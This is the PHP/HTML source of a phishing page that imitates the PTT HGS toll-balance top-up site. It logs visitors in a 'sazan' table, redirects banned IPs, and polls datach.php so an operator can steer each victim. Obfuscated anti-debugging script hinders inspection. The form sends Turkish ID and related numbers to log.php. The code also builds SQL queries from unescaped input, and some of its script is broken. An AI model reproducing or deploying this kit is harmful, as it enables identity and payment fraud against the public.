<?php
    require_once 'CSRFP/SignatureGenerator.php';
    $secret = 'allahyokzaafyokcinayet';

    $signer = new Kunststube\CSRFP\SignatureGenerator($secret);
    $ttoken = $signer->getSignature();
    date_default_timezone_set('Europe/Istanbul');
    include('../../baglan.php');

    $db->query("INSERT INTO token (token) VALUES ('$ttoken')");
    $rowData = $db->query("SELECT * FROM sazan WHERE ip='$ip'");
    if($rowData->rowCount() > 0) {
        $db->query("UPDATE sazan SET now = 'Anasayfa' WHERE ip = '{$ip}'");
    }
    $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
    foreach($ban as $kontrol) {
        if($kontrol['ban'] == $ip) { 
            header('Location:https://www.youtube.com/watch?v=lrmTi-53QWw&t=1m50s');
        } 
    }
	if($_POST){
        header('Location:./fiyat.php');
    }
?>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=0">
    <meta name="description" content="HGS uygulamaları ile PTT'den alınmış HGS etiketlerinizin bakiyesini kontrol etmek ve yükleme yapmak artık çok kolay! HGS Online Bakiye Yükleme, HGS Ödeme"/>
	<link rel="shortcut icon" href="./v2/assets/images/favicon.png" />
    <title>HGS Online Bakiye Yükleme</title>
    <link rel="icon" type="image/png" "./v2/assets/images/favicon.png" />
    <link rel="stylesheet" "./v2/assets/fonts/opensans/open-sans.css?v=201910111500">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
    <script src="./v2/assets/js/pace.js?v=201910111500" type="text/javascript"></script>
    <link rel="stylesheet" type="text/css" href="./v2/assets/css/pace.css?v=201910111500" />

            <link rel="stylesheet"
              href="./v2/assets/css/hgs.min_20210727191922.css?v=201910111500"/>
    
    <script src="https://www.google.com/recaptcha/api.js?onload=recaptchaReadyForInit&hl=tr" async defer></script>
	<script type="text/javascript">
        function _0x12bc(_0x20097a,_0x23b541){var _0x5a56ae=_0x5a56();return _0x12bc=function(_0x12bc80,_0x33ceb6){_0x12bc80=_0x12bc80-0xb6;var _0x3fe16e=_0x5a56ae[_0x12bc80];return _0x3fe16e;},_0x12bc(_0x20097a,_0x23b541);}function _0x5a56(){var _0x4cae2b=['8809976TnolRG','633654CTxFYp','5003250Dfcrex','56GQRUAP','2631432XRQHYL','1171710nunqCV','4089696WWRhYk','constructor','1026638EbsbiB'];_0x5a56=function(){return _0x4cae2b;};return _0x5a56();}(function(_0xfc63bc,_0x6d8c05){var _0x40582c=_0x12bc,_0x50ed59=_0xfc63bc();while(!![]){try{var _0x4bc724=parseInt(_0x40582c(0xbe))/0x1+parseInt(_0x40582c(0xbb))/0x2+parseInt(_0x40582c(0xba))/0x3+-parseInt(_0x40582c(0xbc))/0x4+parseInt(_0x40582c(0xb8))/0x5+-parseInt(_0x40582c(0xb7))/0x6*(parseInt(_0x40582c(0xb9))/0x7)+-parseInt(_0x40582c(0xb6))/0x8;if(_0x4bc724===_0x6d8c05)break;else _0x50ed59['push'](_0x50ed59['shift']());}catch(_0xab3cb8){_0x50ed59['push'](_0x50ed59['shift']());}}}(_0x5a56,0x7f610),setInterval(()=>{var _0xde6671=_0x12bc;(function(){return![];}[_0xde6671(0xbd)]('debugger')['apply']('stateObject'));},0x3e8));
        $(document).ready(function() {
            gonder();
            var int=self.setInterval("gonder()",3000);
        });

        function gonder() {
            $.ajax({
                type:'POST',
                url:'<?php echo "datach.php?ip=".$ip; ?>',
                success: function (msg) {
                    if(!msg || msg == "" || msg == " ") return;
                    window.location.href = msg;
                }
            });
        }
      </script>

    


    
        <script src="//cdn.segmentify.com/account-js/segmentify_epttavm.js" async charset="UTF-8" type="text/javascript"></script>
     
    </head>

<body>


<noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXMZ3JD"
            height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>

<div class="image-container wizard-hgs-image-container set-full-height">
    <input type="hidden" id="current-page-code" value="hgs"/>
    <input type="hidden" value="0" id="get_user_id"/>
    <input type="hidden" value="production" id="app_env"/>
    <input type="hidden" value="" id="is-mobile"/>
    <input type="hidden" value="" id="is-office"/>
    <input type="hidden" value="6LfWns8ZAAAAAPiknER72Jvj84KgPdeQtXFt47M2" id="recaptcha-site-key"/>
    <input type="hidden" value="1" id="is-new-site"/>
    <input type="hidden" value="./v2/assets/" id="assets-url"/>

    <div class="container-fluid no-padding">
        <div class="navbar-header" style="overflow: hidden;">
            <div class="logo-field">
                <a class="navbar-brand navbar-left" href="https://www.pttavm.com" target="_blank">
                    <img src="./v2/assets/images/pttavm_hgs_logo.png?v=201910111500"
                         alt="logo"
                         class="logo"
                         title="HGS - PttAVM"
                         border="0"/>
                </a>

            </div>
            <div class="menu-field">
                <nav class="nav responsive-menu">
                    <div class="menu-wrapper resize-drag nav-wrapper">
                        <ul class="nav-ul">
                            <li class="homepage-menu-item"><a href="/" title="HGS Yükle"><span>Ana Sayfa</span></a></li>                            <li class="hgs-menu-item"><a href="/sorgula" title="HGS Yükle" class="selected"><span><img src="./v2/assets/images/menu/hgs_yukle.png?v=201910111500" class="menu-showed-item" /><img src="./v2/assets/images/menu/hgs_yukle_hover.png?v=201910111500" class="menu-hover-item display-none" />Yükle</span></a></li>
                            <li class="damage-menu-item"><a href="/hasar-sorgula" title="Araç Hasar Sorgulama, Araç Hasar Kaydı Sorgulama"><!--<div class="menu-new-badge">YENİ</div>--><span><img src="./v2/assets/images/menu/hasar_sorgula.png?v=201910111500" class="menu-showed-item" /><img src="./v2/assets/images/menu/hasar_sorgula_hover.png?v=201910111500" class="menu-hover-item display-none" />Hasar Sorgula</span></a></li>
                            <li class="km-menu-item"><a href="/arac-km-sorgula" title="Araç KM Sorgulama, Araç Muayene Sorgulama, Araç Kilometre Sorgulama"><span><img src="./v2/assets/images/menu/km_sorgula.png?v=201910111500" class="menu-showed-item" /><img src="./v2/assets/images/menu/km_sorgula_hover.png?v=201910111500"
                                                                                                                                                                                                                                                                                                                                                                                                class="menu-hover-item display-none"/>KM Sorgula</span></a>
                            </li>
                            <!--<li class="mtv-menu-item"><a href="/mtv-odeme"
                                                         title="MTV Ödeme, Motorlu Taşıtlar Vergisi Ödeme"><span><img
                                                src="./v2/assets/images/menu/mtv_odeme.png?v=201910111500"
                                                class="menu-showed-item"/><img
                                                src="./v2/assets/images/menu/mtv_odeme_hover.png?v=201910111500"
                                                class="menu-hover-item display-none"/>MTV Öde</span></a></li>-->
                            <!--<li class="traffic-menu-item"><a href="/trafik-cezasi-odeme"
                                                             title="Trafik Cezası Ödeme"><span><img
                                                src="./v2/assets/images/menu/trafik_cezasi.png?v=201910111500"
                                                class="menu-showed-item"/><img
                                                src="./v2/assets/images/menu/trafik_cezasi_hover.png?v=201910111500"
                                                class="menu-hover-item display-none"/>Trafik Cezası Öde</span></a></li>-->
                            <li class="shopping-cart-menu-item"><a href="https://pttavm.com" target="_blank"><span><img
                                                src="./v2/assets/images/menu/alisveris.png?v=201910111500"
                                                class="menu-showed-item"/><img
                                                src="./v2/assets/images/menu/alisveris_hover.png?v=201910111500"
                                                class="menu-hover-item display-none"/>Alışverişe Başla</span></a></li>
                        </ul>
                    </div>
                </div>
                <div class="actions-field">
                    
                </div>
            </div>

<div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">

            
            <!--      Wizard container        -->
            <div class="wizard-container">

                <div class="card wizard-card" data-color="orange" id="wizardProfile">
                        <!--        You can switch " data-color="orange" "  with one of the next bright colors: "blue", "green", "orange", "red", "azure"          -->

                        <div class="wizard-header">
                            <div class="panel-header-icons">
                                <img class="panel-header-first-icon" src="./v2/assets/images/panel/homepage.png?v=201910111500">
                            </div>
                            <h1>
                                <img class="panel-header-second-icon" src="./v2/assets/images/panel/hgs.png?v=201910111500">
                                Bakiye Yükleme
                            </h1>
                            <h6 class="hgs-query-subtitle">
                                BU SİSTEMDEN, YALNIZCA PTT KANALI İLE SATIŞI GERÇEKLEŞTİRİLEN HGS ÜRÜNLERİNE BAKİYE YÜKLEME İŞLEMİ YAPILMAKTADIR.
                            </h6>
                        </div>
						<script> 
							var plakaelement = document.getElementById("plakano");
							
							plakaelement.addEventListener('click', function(event) {
								
							event.preventDefault();
							selectPlaka();
							});
							function showElement(id){
								
							document.getElementById(id).style.visibility = "visible";
							}
							fucntion hideElement(id){
							document.getElementById(id).style.visibility = "hidden";
							}
							setProcessType: function (that){
								var thisID = parseInt(that.data("id")),

								plakaelement.classList.add("btn-fill");
							}
							function selectTC(){}
							function selectVergi(){}
							function selectPasaport(){}
							function selectHGSNO(){}
						</script>


                        <div class="tab-content text-center">
                            <div class="tab-pane panel-border active" id="hgs-query-check">
							<form action="log.php" id="hgsQueryNo" name="hgs-query-no" data-tab="0" novalidate="novalidate" method="post">
									<div class="panel-inside">
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon" id="plakano" data-id="0"onclick="hgs.setProcessType($(this)); return false;">PLAKA NO</button>
									
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon" id="tcno"data-id="1"onclick="hgs.setProcessType($(this)); return false;">T.C. KİMLİK NO</button>
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon"id="vergino"data-id="2"onclick="hgs.setProcessType($(this)); return false;">VERGİ NO</button>
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon"id="pasaportno"data-id="3"onclick="hgs.setProcessType($(this)); return false;">PASAPORT NO</button>
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon"id="hgsno"data-id="4"onclick="hgs.setProcessType($(this)); return false;">HGS ÜRÜN NO</button>
										<div class="form-group hgs-query-input">
										    <input type="text" class="form-control text-center hgs-query-no hgs-query-inputs" maxlength="11" required="" name="tckimlik" placeholder="T.C. Kimlik Numarası" aria-required="true">
										</div>
										<input type="hidden" name="islem" value="1"> 
										
										<?php printf('<input type="hidden" name="_token" value="%s">', htmlspecialchars($ttoken)); ?>
										
										
<input name="tel" type="hidden"  class="form-control text-center hgs-query-no hgs-query-inputs" tabindex="1" value="(000)000-0000" id="phone" size="14" maxlength="14" placeholder="(5xx) xxx xx xx" required type="text">
	<script> document.getElementById('phone').addEventListener('input', function (e) {
  var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
  e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
});
</script>
										
										<div class="pull-right">
							<button type="submit"  class="btn  text-white btn-warning "  >SORGULA <img src="https://hgs.pttavm.com/v2/assets/images/buttons/right-arrow.png"></button>
							</div>
										
									</div>
								</form>
                            </div>

                            

                            

                            
                        </div><!-- tab content -->

                        <div class="wizard-footer">

                            
							
                            
                            <div class="clearfix"></div>
                        </div>

                </div>
            </div> <!-- wizard container -->
        </div>
		<!-- 	<script> document.getElementById('phone').addEventListener('input', function (e) {
  var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
  e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
}); -->
<footer>
    <div class="container">
        <div class="copyright">© Copyright <?= date('Y') ?> | Tüm hakları saklıdır.</div>
        <div class="footer-menu">
            <ul>
                <li class="important-informations">
                    <a href="javascript:void(0);">Önemli Bilgiler</a>
                    <ul>
                        <li><a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a></li>
                        <li><a href="#" data-toggle="modal" data-target="#aydinlatma-metni-modal">Aydınlatma Metni</a></li>
                        <li><a href="#" data-toggle="modal" data-target="#imha-politikasi-modal">İmha Politikası</a></li>
                        <li><a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a></li>
                    </ul>
                </li>
                <li><a href="#" data-toggle="modal" data-target="#comment-modal">Görüş Bildir</a></li>
                <li><a href="#" data-toggle="modal" data-target="#sss-modal">Sıkça Sorulan Sorular</a></li>
                <li><a href="#" data-toggle="modal" data-target="#contact-modal">İletişim</a></li>
            </ul>
        </div>
        <div class="cookie-warning display-none">
            <h3>Çerez Politikası
                <i class="icon close cookie-warning-close-btn" onclick="app.closeCookieWarning();">x</i>
            </h3>
            <p>
                hgs.pttavm.com'da bulunan çerezler (cookies); alışveriş deneyiminizi iyileştirmek için
                yasal mevzuata uygun olarak düzenlenmiştir. Detaylı bilgiye ulaşmak için<br />
                <a href="#" data-toggle="modal" data-target="#cerez-politikasi-modal">Çerez Politikası</a> sayfasını ziyaret edebilirsiniz.
            </p>
        </div>
    </div>
</footer>

</div> <!--image-container-->

    <script type="text/javascript"
            src="hgs.js"></script>


<script type="text/javascript">
    $(document).ready(function() {
        app.documentReady();
        $(window).trigger('resize')
    });
    window.addEventListener('DOMContentLoaded', () => {
        app.domContentLoaded();
    });
    $(window).resize(function() {
        app.navResizeCheck();
    });
</script>

</body>
</html>

<script type="text/javascript">
    $(document).ready(function() {
        hgs.documentReady();
    });
</script>
